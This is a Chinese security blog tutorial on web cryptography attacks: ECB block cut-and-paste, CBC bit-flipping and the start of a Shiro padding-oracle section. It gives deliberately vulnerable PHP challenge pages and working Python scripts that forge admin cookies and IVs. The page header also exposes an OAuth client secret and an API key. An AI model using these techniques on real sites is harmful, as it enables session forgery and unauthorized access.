<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="WEB密码学攻击方式从0到1"><meta name="keywords" content=""><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>WEB密码学攻击方式从0到1【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1基本概念"><span class="toc-number">1.</span> <span class="toc-text">0x1基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x1-1分组密码"><span class="toc-number">1.1.</span> <span class="toc-text">0x1.1分组密码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x1-1-1-加密算法"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x1.1.1 加密算法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-1-2-分组模式"><span class="toc-number">2.</span> <span class="toc-text">0x1.1.2 分组模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-2Hash算法"><span class="toc-number"></span> <span class="toc-text">0x1.2Hash算法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x2-攻击方式"><span class="toc-number"></span> <span class="toc-text">0x2 攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-1ECB模式攻击"><span class="toc-number"></span> <span class="toc-text">0x2.1ECB模式攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-2CBC模式攻击"><span class="toc-number"></span> <span class="toc-text">0x2.2CBC模式攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-2-1CBC-字节翻转攻击"><span class="toc-number">1.</span> <span class="toc-text">0x2.2.1CBC 字节翻转攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-2-2CBC-Padding-Oracle-攻击"><span class="toc-number">2.</span> <span class="toc-text">0x2.2.2CBC Padding Oracle 攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-3Hash长度扩展攻击"><span class="toc-number"></span> <span class="toc-text">0x2.3Hash长度扩展攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3-总结"><span class="toc-number"></span> <span class="toc-text">0x3 总结</span></a></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color2"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color4"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color0"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">200</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">WEB密码学攻击方式从0到1</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2021-03-02 | 更新于 2021-03-03</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"></div><div class="button-hover tags"></div></div></div><div class="main-content"><p>ECB、CBC分组模式攻击方式和Hash长度扩展攻击</p>
<a id="more"></a>

<h3 id="0x1基本概念"><a href="#0x1基本概念" class="headerlink" title="0x1基本概念"></a>0x1基本概念</h3><h4 id="0x1-1分组密码"><a href="#0x1-1分组密码" class="headerlink" title="0x1.1分组密码"></a>0x1.1分组密码</h4><p>分组密码又称为分块加密或块加密，是一种对称加密算法，这类算法将明文分成多个等长的组，使用确定的算法和对称秘钥对每组分别加密或解密，常见的算法有DES、3DES、AES。</p>
<h5 id="0x1-1-1-加密算法"><a href="#0x1-1-1-加密算法" class="headerlink" title="0x1.1.1 加密算法"></a>0x1.1.1 加密算法</h5><p>DES需要加密的明文按64位进行分组，加密密钥是根据用户输入的秘钥生成的，密钥长64位，但密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1，在计算密钥时要忽略这8位），分组后的明文组和56位的密钥按位替代或交换的方法形成密文组的加密方法。   </p>
<p>DES算法加密流程 ：<br>（1）输入64位明文数据，并进行初始置换IP；<br>（2）在初始置换IP后，明文数据再被分为左右两部分，每部分32位，以L0，R0表示；<br>（3）在秘钥的控制下，经过16轮运算(f)；<br>（4）16轮后，左、右两部分交换，并连接再一起，再进行逆置换；<br>（5）输出64位密文。<br><img src="../../images/cipher/web1/1.jpg" alt="">  </p>
<p>由于DES密码长度容易被暴力破解，所以3DES算法通过对DES算法进行改进，增加DES的密钥长度来避免类似的攻击，针对每个数据块进行三次DES加密；因此，3DES加密算法并非什么新的加密算法，是DES的一个更安全的变形，它以DES为基本模块，通过组合分组方法设计出分组加密算法。<br>该算法的加解密过程分别是对明文数据进行三次DES加密或解密,得到明文。<br><img src="../../images/cipher/web1/2.jpg" alt=""></p>
<p>AES（Advanced Encryption Standard），在密码学中又称Rijndael加密法，是美国联邦政府采用的一种分组加密标准。这个标准用来替代原先的DES。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同。</p>
<p>AES加密过程涉及到4种操作：字节替代、行移位、列混淆和轮密钥加。<br><img src="../../images/cipher/web1/3.jpg" alt=""></p>
<h3 id="0x1-1-2-分组模式"><a href="#0x1-1-2-分组模式" class="headerlink" title="0x1.1.2 分组模式"></a>0x1.1.2 分组模式</h3><p>在分组加密算法中，有ECB,CBC,CFB,OFB,CTR这几种算法模式。这里就对常见的ECB和CBC模式简单介绍。  </p>
<p>ECB 模式全称为电子密码本模式（Electronic codebook），在ECB模式中，将明文分组加密之后的结果将直接成为密文分组。<br>ECB加密：<br><img src="../../images/cipher/web1/4.jpg" alt=""><br>ECB解密：<br><img src="../../images/cipher/web1/5.jpg" alt=""><br>CBC 全称为密码分组链接（Cipher-block chaining） 模式。在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密。第一个明文分组需要一个初始化向量(IV)进行XOR运算。<br>CBC加密：<br><img src="../../images/cipher/web1/6.jpg" alt=""><br>CBC解密：<br><img src="../../images/cipher/web1/7.jpg" alt=""></p>
<h2 id="0x1-2Hash算法"><a href="#0x1-2Hash算法" class="headerlink" title="0x1.2Hash算法"></a>0x1.2Hash算法</h2><p>Hash是把任意长度的输入通过散列算法变换成固定长度的输出，该输出就是散列值。<br>常见的hash算法有MD5、SHA1、SHA256 、SHA512等。<br><img src="../../images/cipher/web1/9.jpg" alt=""><br>MD5 算法的输入为长度小于 264 bit 的消息比特串，输出为固定 128 bit 的消息散列值，输入数据需要以 512 bit 为单位进行分组。     </p>
<p>MD5的实现原理图：<br><img src="../../images/cipher/web1/8.jpg" alt=""><br>MD5实现步骤：<br>（1）填充bits<br>  如果输入message(bit)对512求余的结果不等于448，就需要填充使其结果等于448。补位二进制是在message的后面加上一个1，后面跟着 n 个0。在 16 进制下，需要在message后补80，就是 2 进制的10000000。填充完后，len(message)mod512=448(bit)。<br>（2）补充长度<br>补位之后，用64位来存储填充前信息长度。这64位加在第一步结果的后面。这样len(message)mod512=0。长度是小端存储的，也就是说高字节放在高地址中。<br>例如要对 “hello world”进行填充：”hello world”是11个字母，11 byte (88 bit )，换算成16进制位0x58，其后跟着7个字节的0x00，则：<br><img src="../../images/cipher/web1/10.jpg" alt=""><br>（3）初始化向量<br>初始链接变量 IV 在最开始存于 4 个 32 bit 的寄存器 A、B、C、D 中，将参与第一个分组单元的哈希运算，它们分别为：<br><img src="../../images/cipher/web1/11.jpg" alt=""><br>（4）复杂的函数运算   </p>
<h1 id="0x2-攻击方式"><a href="#0x2-攻击方式" class="headerlink" title="0x2 攻击方式"></a>0x2 攻击方式</h1><h2 id="0x2-1ECB模式攻击"><a href="#0x2-1ECB模式攻击" class="headerlink" title="0x2.1ECB模式攻击"></a>0x2.1ECB模式攻击</h2><p>ECB将明文分组加密后直接成为密文分组，而密文则是由密文分组直接拼接而成。<br>因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果。     </p>
<p>例题：<br>cbc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php7</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AES</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $privateKey = <span class="string">"12345678123456781234567812345678"</span>;</span><br><span class="line">    $encrypted=openssl_encrypt($data,<span class="string">'AES-128-ECB'</span>,$privateKey,OPENSSL_RAW_DATA);</span><br><span class="line">    <span class="comment">#$encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateKey, $data, MCRYPT_MODE_ECB);</span></span><br><span class="line">    $encryptedData = (base64_encode($encrypted));</span><br><span class="line">    <span class="keyword">return</span> $encryptedData;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DE__AES</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $privateKey = <span class="string">"12345678123456781234567812345678"</span>;</span><br><span class="line">    $encryptedData = base64_decode($data);</span><br><span class="line">   $decrypted=openssl_decrypt($encryptedData,<span class="string">'AES-128-ECB'</span>,$privateKey,OPENSSL_RAW_DATA);</span><br><span class="line">    $decrypted = rtrim($decrypted, <span class="string">""</span>) ;</span><br><span class="line">    <span class="keyword">return</span> $decrypted;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'a'</span>]==<span class="string">'reg'</span>)&#123;</span><br><span class="line">    setcookie(<span class="string">'uid'</span>, AES(<span class="string">'9'</span>));</span><br><span class="line">    setcookie(<span class="string">'username'</span>, AES($_POST[<span class="string">'username'</span>]));</span><br><span class="line">    header(<span class="string">"Location: http://127.0.0.1/ecb.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@!<span class="keyword">isset</span>($_COOKIE[<span class="string">'uid'</span>])||@!<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form method="post" action="ecb.php?a=reg"&gt;</span></span><br><span class="line"><span class="string">Username:&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text"  name="username"&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">Password:&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" name="password" &gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="submit" value="注册"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt; '</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $uid = DE__AES($_COOKIE[<span class="string">'uid'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( $uid != <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'uid:'</span> .$uid .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hi '</span> . DE__AES($_COOKIE[<span class="string">'username'</span>]) .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are not administrotor!!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Hi you are administrotor!!"</span> .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Flag is flag&#123;this is flag&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解题思路：<br>以administrator权限登陆就就能获得Flag。判断权限则是根据cookie里面的uid参数，cookie包含username和uid两个参数，均为使用ECB加密的密文，然而username的密文是根据注册时的明文生成的</p>
<p>因此我们可以根据username的明文操纵生成我们想要的uid的密文。经过fuzz发现明文分组块为16个字节，那么我们注册17字节的用户，多出的那一个字节就可以是我们我们希望的UID的值，而此时我们查看username的密文增加部分就是UID的密文，即可伪造UID。</p>
<p>注册aaaaaaaaaaaaaaaa1获得1的密文分组,注册aaaaaaaaaaaaaaaa2获得2的密文分组，以此类推<br>exp</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import urllib2</span><br><span class="line">import base64</span><br><span class="line">import cookielib</span><br><span class="line">import Cookie</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(1,50):</span><br><span class="line">    reg_url=<span class="string">'http://127.0.0.1/ecb.php?a=reg'</span></span><br><span class="line">    index_url=<span class="string">'http://127.0.0.1/ecb.php'</span></span><br><span class="line">    cookie=cookielib.CookieJar()</span><br><span class="line">    opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))</span><br><span class="line">    opener.addheaders.append((<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0'</span>))</span><br><span class="line">    num=str(num)</span><br><span class="line">    values=&#123;<span class="string">'username'</span>:<span class="string">'aaaaaaaaaaaaaaaa'</span>+num,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">    data=urllib.urlencode(values)</span><br><span class="line">    opener.open(reg_url,data)</span><br><span class="line">    text=opener.open(index_url,data)</span><br><span class="line">    <span class="keyword">for</span> ck <span class="keyword">in</span> cookie:</span><br><span class="line">        <span class="keyword">if</span> ck.name==<span class="string">'username'</span>:</span><br><span class="line">            user_name=ck.value</span><br><span class="line">    user_name = urllib.unquote(user_name)</span><br><span class="line">    user_name = base64.b64decode(user_name)</span><br><span class="line">    hex_name = user_name.encode(<span class="string">'hex'</span>)</span><br><span class="line">    hex_name = hex_name[len(hex_name)/2:]</span><br><span class="line">    hex_name = hex_name.decode(<span class="string">'hex'</span>)</span><br><span class="line">    uid = base64.b64encode(hex_name)</span><br><span class="line">    uid = urllib.quote(uid)</span><br><span class="line">    <span class="keyword">for</span> ck <span class="keyword">in</span> cookie:</span><br><span class="line">        <span class="keyword">if</span> ck.name==<span class="string">'uid'</span>:</span><br><span class="line">            ck.value=uid</span><br><span class="line">    text=opener.open(index_url).<span class="built_in">read</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Flag'</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="built_in">print</span> text</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span> num</span><br></pre></td></tr></table></figure>
<h2 id="0x2-2CBC模式攻击"><a href="#0x2-2CBC模式攻击" class="headerlink" title="0x2.2CBC模式攻击"></a>0x2.2CBC模式攻击</h2><h3 id="0x2-2-1CBC-字节翻转攻击"><a href="#0x2-2-1CBC-字节翻转攻击" class="headerlink" title="0x2.2.1CBC 字节翻转攻击"></a>0x2.2.1CBC 字节翻转攻击</h3><p>因为CBC模式是将前一个密文分组和明文分组进行混合加密,所以是可以避免ECB模式的弱点。</p>
<p>但正因为如此，导致解密时修改前一个密文分组就可以操纵后一个的解密后的明文分组，可以将前一个密文中的任意比特进行修改（0,1进行互换，也可以叫翻转）</p>
<p>因此CBC模式有两个攻击点：</p>
<ul>
<li>iv向量，影响第一个明文分组</li>
<li>第n个密文分组，影响第n+1个明文分组</li>
</ul>
<p>密文通过block cipher encryption解密，得到中间密文，中间密文与IV(或前一个密文区块)异或后得到的是明文，因此可以通过攻击IV，来改变最终的明文。 </p>
<p>IV的值该如何修改？可以简单的推理一下。<br>解密过程中，因为中间密文 ^ 原始IV = 原始明文 ，所以中间密文=原始IV^原始明文。我们想要的伪造明文=中间密文^伪造IV = 原始IV^原始明文^伪造IV，可以推出伪造IV=原始IV^原始明文^伪造明文。随意我们只要知道原始IV和原始明文这两个值，就可以伪造解密后的结果。 </p>
<p>举例：<br>密文1[4]的意思是密文1字符串第4个字节，相当于数组下标。<br>设：密文1[4] = A，中间密文2[4] = B，明文2[4] = C<br>因为A ^ B = C，根据结论有B = A ^ C<br>当人为修改A=A ^ C时，那么A ^ B = A ^ C ^ B = B ^ B = 0，这样明文2[4]的结果就为0了<br>当人为修改A=A ^ C ^ x (x为任意数值)时，那么<br>A ^ B = A ^ C ^ x ^ B = B ^ B ^ x = x，这是明文2[4] = x，这样就达到了控制明文某个字节的目的了。    </p>
<p>例题：<br>cbc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">$iv = <span class="string">'NGY0MWVlOGE2MGU4NTkxMQ=='</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($str,$key,$iv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($str),<span class="string">"AES-128-CBC"</span>,$key,OPENSSL_RAW_DATA,base64_decode($iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str,$key,$iv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($str,<span class="string">"AES-128-CBC"</span>,$key,OPENSSL_RAW_DATA, base64_decode($iv)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(decode($_COOKIE[<span class="string">'username'</span>],$key,$_COOKIE[<span class="string">'iv'</span>]) === <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello admin&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $flag.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(decode($_COOKIE[<span class="string">'username'</span>],$key,$_COOKIE[<span class="string">'iv'</span>]) === <span class="string">"guest"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello guest&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"iv or username error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $enc = encode(<span class="string">"guest"</span>,$key,$iv);</span><br><span class="line">    setcookie(<span class="string">'username'</span>,$enc);</span><br><span class="line">    setcookie(<span class="string">'iv'</span>,$iv);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = <span class="string">"8bd54bcfe6a23fc0"</span>;</span><br><span class="line">$flag = <span class="string">"flag&#123;this_is_flag&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解题思路:   </p>
<p>可以得到IV值和原本明文 “guest”,从源码中知，只要伪造明文 “admin”,即可得到flag，计算伪造IV值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">iv = base64.b64decode(<span class="string">'NGY0MWVlOGE2MGU4NTkxMQ=='</span>)</span><br><span class="line">admin = <span class="string">'admin'</span> + <span class="string">'\x0b'</span>*<span class="number">11</span></span><br><span class="line">guest = <span class="string">'guest'</span> + <span class="string">'\x0b'</span>*<span class="number">11</span></span><br><span class="line">new_iv = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(admin)):</span><br><span class="line">    new_iv += chr(ord(iv[i]) ^ ord(admin[i]) ^ ord(guest[i]))</span><br><span class="line"><span class="keyword">print</span> base64.b64encode(new_iv)</span><br><span class="line"><span class="comment"># Mnc8K39lOGE2MGU4NTkxMQ==</span></span><br></pre></td></tr></table></figure>
<p><img src="../../images/cipher/web1/12.jpg" alt=""></p>
<h3 id="0x2-2-2CBC-Padding-Oracle-攻击"><a href="#0x2-2-2CBC-Padding-Oracle-攻击" class="headerlink" title="0x2.2.2CBC Padding Oracle 攻击"></a>0x2.2.2CBC Padding Oracle 攻击</h3><p>分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度:<br><img src="../../images/cipher/web1/13.jpg" alt=""><br>这个时候，普遍的做法是PKCS#5标准中定义的规则，在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充3个0×03<br><img src="../../images/cipher/web1/14.jpg" alt=""></p>
<p>因为填充发生在最后一个分组，所以我们主要关注最后一个分组<br><img src="../../images/cipher/web1/15.jpg" alt=""><br>在Padding Oracle Attack攻击中，攻击者输入的参数是IV和Cipher，要通过对IV的”穷举”来请求服务器端对指定的Cipher进行解密，并对返回的结果进行判断,猜解出正确的中间密文，得到中间密文后，就可以伪造IV来伪造明文。<br>比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。<br>详情可看此文章：<a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/15504.html</a>       </p>
<p>利用条件： </p>
<ol>
<li>攻击者知道密文和初始向量IV</li>
<li>padding错误和padding正确服务器可返回不一样的状态   </li>
</ol>
<p>以Shiro padding oracle 为例：    </p>
<p>Shiro的 RememberMe 使用 AES-128-CBC 模式加密，容易受到 Padding Oracle 攻击，AES 的初始化向量 IV 就是cookie的 rememberMe base64 解码后的前16个字。</p>
<p>Shrio要有Oracle Padding漏洞，有填充提示</p>
<ul>
<li>接受正确的密文（填充正确包含合法值），应用程序返回HTTP 200</li>
<li>接受非法的密文（解密后填充不正确），应用程序返回HTTP 500，返回框架错误页面</li>
<li>接受合法的密文（填充正确，值不合法），应用程序显示自定义错误HTTP 200，但是有返回自定义错误页面</li>
</ul>
<p>实际上不是原本的请求，都不满足第一条，所以只要填充正确和填充不正确返回不同就可以了。</p>
<p>漏洞环境搭建 </p>
